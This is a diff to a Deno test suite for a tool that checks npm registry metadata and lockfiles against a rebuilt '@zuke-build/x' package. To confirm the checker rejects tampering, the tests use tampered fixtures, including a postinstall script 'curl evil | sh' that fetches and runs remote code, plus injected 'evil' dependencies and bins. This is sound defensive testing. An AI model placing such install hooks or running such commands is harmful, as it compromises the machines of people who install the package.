@@ -26,6 +26,8 @@ import {
   type ExpectedProvenance,
   failures,
   type GitProbe,
+  manifestProblems,
+  NPM_ACTED_ON_FIELDS,
   type NpmProbe,
   type NpmSource,
   provenanceProblems,
@@ -107,14 +109,13 @@ Deno.test("distOf reads a version's integrity and attestations, null when absent
     attestations: { url: "a", provenance: { predicateType: SLSA } },
   };
   const doc = (d: unknown) => ({ versions: { "1.0.0": { dist: d } } });
-  assertEquals(distOf(doc(dist), "1.0.0"), {
-    integrity: "i",
-    attestations: "a",
-  });
-  assertEquals(distOf(doc({ tarball: "u", integrity: "i" }), "1.0.0"), {
-    integrity: "i",
-    attestations: null,
-  });
+  assertEquals(distOf(doc(dist), "1.0.0")?.attestations, "a");
+  assertEquals(distOf(doc(dist), "1.0.0")?.integrity, "i");
+  assertEquals(
+    distOf(doc({ tarball: "u", integrity: "i" }), "1.0.0")?.attestations,
+    null,
+  );
+  assertEquals(distOf(doc(dist), "1.0.0")?.manifest, { dist });
   for (const absent of [null, [], {}, { versions: [] }, doc(dist)]) {
     assertEquals(distOf(absent, "2.0.0"), null);
   }
@@ -293,6 +294,11 @@ async function world(
     installed?: Record<string, string>;
     lockIntegrity?: string;
     document?: (integrity: string) => unknown;
+    /** Fields the registry's metadata for the version has besides the rebuild's. */
+    metadata?: Record<string, unknown>;
+    /** What the install's lockfile holds besides `@zuke-build/x`. */
+    lockExtra?: Record<string, unknown>;
+    lockBin?: unknown;
     stmt?: Partial<ExpectedProvenance>;
     attested?: boolean;
     badSignature?: boolean;
@@ -318,7 +324,16 @@ async function world(
     document: (pkg) =>
       Promise.resolve(
         pkg !== "x" ? null : over.document?.(integrity) ??
-          { versions: { "1.0.0": { dist } } },
+          {
+            versions: {
+              "1.0.0": {
+                name: "@zuke-build/x",
+                version: "1.0.0",
+                dist,
+                ...over.metadata,
+              },
+            },
+          },
       ),
     attestations: () =>
       Promise.resolve({
@@ -349,10 +364,13 @@ async function world(
         `${project}/package-lock.json`,
         JSON.stringify({
           packages: {
+            "": { name: "consumer" },
             "node_modules/@zuke-build/x": {
               version: "1.0.0",
               integrity: over.lockIntegrity ?? integrity,
+              ...(over.lockBin === undefined ? {} : { bin: over.lockBin }),
             },
+            ...over.lockExtra,
           },
         }),
       );
@@ -421,7 +439,85 @@ Deno.test("verifyAll: a changed, an extra and a missing installed file are each 
 
 Deno.test("verifyAll: a lockfile that records another integrity is a mismatch", async () => {
   const out = await run({ lockIntegrity: integrityOf(8).integrity });
-  assertStringIncludes(problemsOf(out)[0], "integrity or version other than");
+  assertStringIncludes(problemsOf(out)[0], "version or integrity other than");
+});
+
+Deno.test("verifyAll: registry metadata that only adds its own bookkeeping matches", async () => {
+  const out = await run({
+    metadata: {
+      _id: "@zuke-build/x@1.0.0",
+      _npmVersion: "11.0.0",
+      _nodeVersion: "24.0.0",
+      gitHead: "abc",
+      maintainers: [{ name: "m" }],
+      directories: {},
+      _hasShrinkwrap: false,
+      author: { name: "a" },
+    },
+  });
+  assertEquals(out.result.get("x")?.status, "match");
+});
+
+Deno.test("verifyAll: metadata that differs from the rebuilt package.json in a field npm acts on fails", async () => {
+  const cases: Array<[string, Record<string, unknown>]> = [
+    ["scripts", { scripts: { postinstall: "curl evil | sh" } }],
+    ["dependencies", { dependencies: { evil: "1.0.0" } }],
+    ["hasInstallScript", { hasInstallScript: true }],
+    ["bin", { bin: { x: "evil.js" } }],
+    ["os", { os: ["linux"] }],
+    ["name", { name: "@zuke-build/y" }],
+    ["version", { version: "1.0.0-evil" }],
+  ];
+  for (const [field, metadata] of cases) {
+    const out = await run({ metadata });
+    assertEquals(problemsOf(out), [
+      `the registry's metadata for ${field} differs from the rebuilt package.json.`,
+    ]);
+  }
+});
+
+Deno.test("manifestProblems lists every field npm acts on and nothing else", () => {
+  assertEquals(NPM_ACTED_ON_FIELDS.includes("scripts"), true);
+  assertEquals(
+    manifestProblems(
+      { name: "x", extra: 1 },
+      text('{"name":"x","files":["a"]}'),
+    ),
+    [],
+  );
+  assertEquals(manifestProblems({}, text("{")).length, 1);
+  assertEquals(manifestProblems({}, undefined).length, 1);
+});
+
+Deno.test("verifyAll: a lockfile with another package, an install script or a bin fails", async () => {
+  const other = await run({
+    lockExtra: { "node_modules/evil": { version: "1.0.0" } },
+  });
+  assertStringIncludes(
+    problemsOf(other)[0],
+    "node_modules/evil, which is not one of ours",
+  );
+  const script = await run({
+    lockExtra: {
+      "node_modules/@zuke/x": { name: "@zuke-build/x", hasInstallScript: true },
+    },
+  });
+  assertStringIncludes(problemsOf(script)[0], "has an install script");
+  const bin = await run({ lockBin: { x: "evil.js" } });
+  assertStringIncludes(
+    problemsOf(bin)[0],
+    "has a bin other than the rebuild's",
+  );
+  const alias = await run({
+    lockExtra: {
+      "node_modules/@zuke/x": { name: "@zuke-build/x", version: "1.0.1" },
+    },
+  });
+  assertEquals(alias.result.get("x")?.status, "match");
+  const gone = await run({
+    lockExtra: { "node_modules/@zuke-build/x": undefined },
+  });
+  assertStringIncludes(problemsOf(gone)[0], "no entry for @zuke-build/x");
 });
 
 Deno.test("verifyAll: provenance for another repository, workflow, ref, commit or bytes fails before anything is installed", async () => {
